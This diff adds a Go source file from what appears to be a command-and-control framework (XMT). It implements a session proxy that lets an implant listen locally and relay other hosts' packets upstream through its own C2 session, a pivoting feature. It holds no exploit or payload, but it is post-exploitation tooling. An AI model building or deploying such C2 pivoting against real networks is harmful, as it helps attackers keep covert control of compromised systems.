@@ -1,0 +1,132 @@
+//go:build !multiproxy && !noproxy
+
+package c2
+
+import (
+	"context"
+	"io"
+
+	"github.com/iDigitalFlame/xmt/c2/cout"
+	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/device/local"
+	"github.com/iDigitalFlame/xmt/util/xerr"
+)
+
+type proxyBase struct {
+	*Proxy
+}
+
+func (s *Session) updateProxyStats() {
+	if !s.IsActive() {
+		return
+	}
+	n := &com.Packet{ID: SvProxy, Device: local.UUID}
+	if s.proxy != nil && s.proxy.IsActive() {
+		n.WriteUint8(1)
+		n.WriteString("")
+		n.WriteString(s.proxy.addr)
+	} else {
+		if n.WriteUint8(0); s.proxy != nil {
+			s.proxy = nil
+		}
+	}
+	s.queue(n)
+}
+func (s *Session) checkProxyMarshal() bool {
+	if s.proxy == nil {
+		return true
+	}
+	_, ok := s.proxy.p.(marshaler)
+	return ok
+}
+
+// GetProxy returns the current Proxy (if enabled). This function take a name
+// argument that is a string that specifies the Proxy name.
+//
+// By default, the name is ignored as multiproxy support is disabled.
+//
+// WHen proxy support is disabled, this always returns nil.
+func (s *Session) GetProxy(_ string) *Proxy {
+	return s.proxy.Proxy
+}
+func (s *Session) writeProxyInfo(w io.Writer, d *[8]byte) error {
+	if s.proxy == nil || !s.proxy.IsActive() {
+		(*d)[0] = 0
+		return writeFull(w, 1, (*d)[0:1])
+	}
+	n := uint64(len(s.proxy.addr))
+	(*d)[0], (*d)[1], (*d)[2], (*d)[3], (*d)[4] = 1, byte(n>>8), byte(n), 0, 0
+	if err := writeFull(w, 3, (*d)[0:3]); err != nil {
+		return err
+	}
+	if err := writeFull(w, len(s.proxy.addr), []byte(s.proxy.addr)); err != nil {
+		return err
+	}
+	p, ok := s.proxy.p.(marshaler)
+	if !ok {
+		return xerr.Sub("cannot marshal Proxy Profile", 0xC)
+	}
+	b, err := p.MarshalBinary()
+	if err != nil {
+		return err
+	}
+	return writeSlice(w, d, b)
+}
+
+// Proxy establishes a new listening Proxy connection using the supplied Profile
+// name and bind address that will send any received Packets "upstream" via the
+// current Session.
+//
+// Packets destined for hosts connected to this proxy will be routed back and
+// forth on this Session.
+//
+// This function will return an error if this is not a client Session or
+// listening fails.
+func (s *Session) Proxy(_, addr string, p Profile) (*Proxy, error) {
+	if s.parent != nil {
+		return nil, xerr.Sub("must be a client session", 0x5)
+	}
+	// TODO(dij): Need to enable this, but honestly its a lot of work for
+	//            something that might have 0 use.
+	//
+	//            People, if you feel otherwise, put in a GitHub issue plz.
+	//
+	// NOTE(dij): Build with the "multiproxy" tag to remove this restriction
+	if s.proxy != nil {
+		return nil, xerr.Sub("only a single Proxy per session can be active", 0x2)
+	}
+	if p == nil {
+		return nil, ErrInvalidProfile
+	}
+	h, w, t := p.Next()
+	if len(addr) > 0 {
+		h = addr
+	}
+	if len(h) == 0 {
+		return nil, ErrNoHost
+	}
+	l, err := p.Listen(s.ctx, h)
+	if err != nil {
+		return nil, xerr.Wrap("unable to listen", err)
+	}
+	if l == nil {
+		return nil, xerr.Sub("unable to listen", 0x8)
+	}
+	v := &Proxy{
+		ch:         make(chan struct{}, 1),
+		addr:       h,
+		close:      make(chan uint32, 8),
+		parent:     s,
+		clients:    make(map[uint32]*proxyClient),
+		listener:   l,
+		connection: connection{s: s.s, p: p, w: w, m: s.m, t: t, log: s.log},
+	}
+	if v.ctx, v.cancel = context.WithCancel(s.ctx); cout.Enabled {
+		s.log.Info("[%s/P] Added Proxy Listener on %q!", s.ID, h)
+	}
+	s.proxy = &proxyBase{v}
+	s.proxy.f = s.updateProxyStats
+	s.updateProxyStats()
+	go v.listen()
+	return v, nil
+}
